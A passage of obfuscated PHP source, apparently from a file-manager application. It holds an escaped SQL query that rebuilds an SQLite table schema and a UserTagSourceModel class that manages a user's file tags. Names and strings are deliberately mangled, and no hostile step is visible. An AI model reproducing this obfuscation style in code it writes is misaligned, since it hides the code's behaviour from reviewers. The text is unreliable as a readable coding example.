"\123\105\114\x45\x43\124\x20\x2a\x20\x46\x52\117\115\40\163\161\154\x69\164\145\x5f\x6d\x61\163\164\145\162\40\127\110\105\x52\x45\x20\x74\x62\x6c\137\156\141\155\145\x20\75\x20\47{$ÑéÔ¥¾}\47"; $—û°¦Ñ… = $šœ®¯İ¤->query($Ã…Õ·¡); if (empty($—û°¦Ñ…)) { $ıêîêºè = array($·è¦•“”[810] => $·è¦•“”[12], $·è¦•“”[13] => $·è¦•“”[12]); return $±íÛÛ›æ ? $ıêîêºè[$±íÛÛ›æ] : $ıêîêºè; } $—¤¡¸Š = $šœ®¯İ¤->query($©ñÛ«Á‘); $»½˜“êÁ = $ÓÔŸ©¨ = array(); foreach ($—¤¡¸Š as $óğ…÷ªá) { if ($óğ…÷ªá[$·è¦•“”[33]] == $·è¦•“”[279]) { $»½˜“êÁ[] = $óğ…÷ªá[$·è¦•“”[1136]]; } else { $ÓÔŸ©¨[$óğ…÷ªá[$·è¦•“”[32]]] = $óğ…÷ªá[$·è¦•“”[1136]]; } } $Ñö­”ï = array_merge(array($·è¦•“”[1132] . $ÑéÔ¥¾ . $·è¦•“”[118]), $»½˜“êÁ, array_values($ÓÔŸ©¨)); $Ñö­”ï = implode($·è¦•“”[71] . PHP_EOL, $Ñö­”ï) . $·è¦•“”[71]; if ($±íÛÛ›æ && $±íÛÛ›æ == $·è¦•“”[13]) { return $Ñö­”ï; } $î ç«ºì = array(); $ËóÙ‹‘ª = array($·è¦•“”[1124] => $·è¦•“”[1137], $·è¦•“”[315] => $·è¦•“”[1138]); $†„ıö»Ñ = $·è¦•“”[12]; foreach ($—û°¦Ñ… as $óğ…÷ªá) { if ($óğ…÷ªá[$·è¦•“”[57]] == $·è¦•“”[88]) { $†„ıö»Ñ = $óğ…÷ªá[$·è¦•“”[32]]; } $Èì´ïî = array($·è¦•“”[385] . $óğ…÷ªá[$·è¦•“”[32]] . $·è¦•“”[385], isset($ËóÙ‹‘ª[$óğ…÷ªá[$·è¦•“”[33]]]) ? $ËóÙ‹‘ª[$óğ…÷ªá[$·è¦•“”[33]]] : $óğ…÷ªá[$·è¦•“”[33]], $óğ…÷ªá[$·è¦•“”[35]] == $·è¦•“”[88] ? $·è¦•“”[1129] : $·è¦•“”[1139] . $óğ…÷ªá[$·è¦•“”[56]], $óğ…÷ªá[$·è¦•“”[57]] == $·è¦•“”[88] ? $·è¦•“”[1140] : $·è¦•“”[12]); $î ç«ºì[] = trim(implode($·è¦•“”[53], $Èì´ïî)); } foreach ($ÓÔŸ©¨ as $é±êÍîš => $½Øİ±©) { $óé¯áç¢ = str_replace($·è¦•“”[1141] . $ÑéÔ¥¾ . $·è¦•“”[11], $·è¦•“”[12], $é±êÍîš); $àãø®«õ = str_replace(array($·è¦•“”[118], $·è¦•“”[963]), $·è¦•“”[385], substr($½Øİ±©, stripos($½Øİ±©, $·è¦•“”[260]))); if ($óé¯áç¢ == $·è¦•“”[1118]) { $‚£ÚÀ¸Æ = $·è¦•“”[1142] . $†„ıö»Ñ . $·è¦•“”[1143]; } else { $‚£ÚÀ¸Æ = (stripos($óé¯áç¢, $·è¦•“”[11]) ? $·è¦•“”[1144] : $·è¦•“”[12]) . ($·è¦•“”[1145] . $óé¯áç¢ . $·è¦•“”[1146] . $àãø®«õ); } $î ç«ºì[] = $‚£ÚÀ¸Æ; } $üŞÄ¼¢º = array($·è¦•“”[1147] . $ÑéÔ¥¾ . $·è¦•“”[1148], $·è¦•“”[1149] . $ÑéÔ¥¾ . $·è¦•“”[1150], implode($·è¦•“”[50] . PHP_EOL, $î ç«ºì), $·è¦•“”[1151]); $Ü•İ¡÷‡ = implode(PHP_EOL, $üŞÄ¼¢º); if ($±íÛÛ›æ && $±íÛÛ›æ == $·è¦•“”[810]) { return $Ü•İ¡÷‡; } $ıêîêºè = array($·è¦•“”[810] => $Ü•İ¡÷‡, $·è¦•“”[13] => $Ñö­”ï); return $±íÛÛ›æ ? $ıêîêºè[$±íÛÛ›æ] : $ıêîêºè; } } goto D£§…Ê; CÛ²§íÍ©: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($Â¯‰®¤·) { $ß¸åòÅ§ =& $_SERVER[§ŒØóıü]; return array($ß¸åòÅ§[1973] => array($ß¸åòÅ§[2356] . USER_ID, $ß¸åòÅ§[1974])); } protected function listData() { $¾ÅÎ»©É =& $_SERVER[§ŒØóıü]; $ª¦°»Ó = array($¾ÅÎ»©É[1664] => USER_ID, $¾ÅÎ»©É[483] => array($¾ÅÎ»©É[1977], 0)); $Å¡®ªÈî = $¾ÅÎ»©É[2357]; $Íí»Ì  = $this->field($Å¡®ªÈî)->where($ª¦°»Ó)->order($¾ÅÎ»©É[1980])->select(); return $Íí»Ì  ? $Íí»Ì  : array(); } protected function addToTag($õ¶ı¯—Ñ, $÷ôÇ¡òë) { $îÛ½»¡¢ =& $_SERVER[§ŒØóıü]; if (!Model($îÛ½»¡¢[2121])->listData($÷ôÇ¡òë)) { return !1; } if (is_numeric($õ¶ı¯—Ñ)) { $é§øÚ©½ = Model($îÛ½»¡¢[831])->pathInfo($õ¶ı¯—Ñ); if (!$é§øÚ©½) { return !1; } } else { $é§øÚ©½ = IO::infoSimple($õ¶ı¯—Ñ); if (!$é§øÚ©½) { return !1; } $ÍŒ¯õµ´ = $é§øÚ©½[$îÛ½»¡¢[32]]; $¢ò×İ§Ä = $é§øÚ©½[$îÛ½»¡¢[33]]; if (isset($é§øÚ©½[$îÛ½»¡¢[410]])) { $¢ò×İ§Ä = $é§øÚ©½[$îÛ½»¡¢[410]] == $îÛ½»¡¢[88] ? $îÛ½»¡¢[75] : $îÛ½»¡¢[200]; } } $Ï¸Ôšß = array($îÛ½»¡¢[1664] => USER_ID, $îÛ½»¡¢[483] => $÷ôÇ¡òë, $îÛ½»¡¢[421] => $õ¶ı¯—Ñ, $îÛ½»¡¢[422] => $¢ò×İ§Ä ? $¢ò×İ§Ä : $îÛ½»¡¢[416], $îÛ½»¡¢[420] => $ÍŒ¯õµ´ ? $ÍŒ¯õµ´ : $îÛ½»¡¢[12], $îÛ½»¡¢[1866] => 0); if ($this->where($Ï¸Ôšß)->find()) { return !1; } return $this->add($Ï¸Ôšß); } protected function removeFromTag($ò”ìÉş¶, $›¹´—Ò¸) { $ø¢‘ù³ =& $_SERVER[§ŒØóıü]; if (!Model($ø¢‘ù³[2121])->listData($›¹´—Ò¸)) { return !1; } if (is_array($ò”ìÉş¶)) { $ò”ìÉş¶ = array($ø¢‘ù³[7], $ò”ìÉş¶); } $«òÇ™ˆé = array($ø¢‘ù³[1664] => USER_ID, $ø¢‘ù³[483] => $›¹´—Ò¸, $ø¢‘ù³[421] => $ò”ìÉş¶); return $this->where($«òÇ™ˆé)->delete(); } protected function removeByTag($Ñ³•²ôö) { $×Õ…íÌÇ =& $_SERVER[§ŒØóıü]; if (!$Ñ³•²ôö) { return !1; } $ÏÀ¿Œúä = array($×Õ…íÌÇ[1664] => USER_ID, $×Õ…íÌÇ[483] => $Ñ³•²ôö); return $this->where($ÏÀ¿Œúä)->delete(); } protected function removeBySource($Ì”İ¥­Ï) { $·èÊÇõƒ =& $_SERVER[§ŒØóıü]; if (is_array($Ì”İ¥­Ï)) { $Ì”İ¥­Ï = array($·èÊÇõƒ[7], $Ì”İ¥­Ï); } $¥…æ°°ª = array($·èÊÇõƒ[1664] => USER_ID, $·èÊÇõƒ[483] => array($·èÊÇõƒ[1020], 0), $·èÊÇõƒ[421] => $Ì”İ¥­Ï); return $this->where($¥…æ°°ª)->delete(); } }